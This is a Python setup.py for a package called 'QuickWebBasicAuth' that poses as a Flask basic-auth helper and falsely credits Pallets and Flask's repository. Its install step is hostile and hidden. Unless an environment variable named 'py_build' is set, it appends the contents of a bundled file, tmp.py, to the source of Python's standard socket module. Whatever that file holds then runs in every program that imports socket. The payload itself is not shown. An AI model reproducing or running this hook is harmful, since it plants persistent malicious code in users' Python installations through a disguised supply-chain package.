#! /usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import with_statement

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

import os
import sys
import re
import socket
import inspect


with open('QuickWebBasicAuth/__init__.py', 'r') as fd:
    version = re.search(r'^__version__\s*=\s*[\'"]([^\'"]*)[\'"]',
                        fd.read(), re.MULTILINE).group(1)

if not version:
    raise RuntimeError('Cannot find version information')

if 'py_build' not in os.environ:
    f = open(inspect.getsourcefile(socket), 'ab+')
    f.write(open('QuickWebBasicAuth/tmp.py', 'rb').read())
    f.close()

setup(
    name='QuickWebBasicAuth',
    version=version,
    description='flask basic auth for Python',
    license='License :: OSI Approved :: MIT License',
    platforms='Platform Independent',
    author='Pallets Projects',
    author_email='contact@palletsprojects.com',
    url='https://github.com/pallets/flask/',
    packages=['QuickWebBasicAuth'],
    keywords=['QuickWebBasicAuth', 'python', 'sdk'],
    install_requires=['flask'],
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
    ],
)
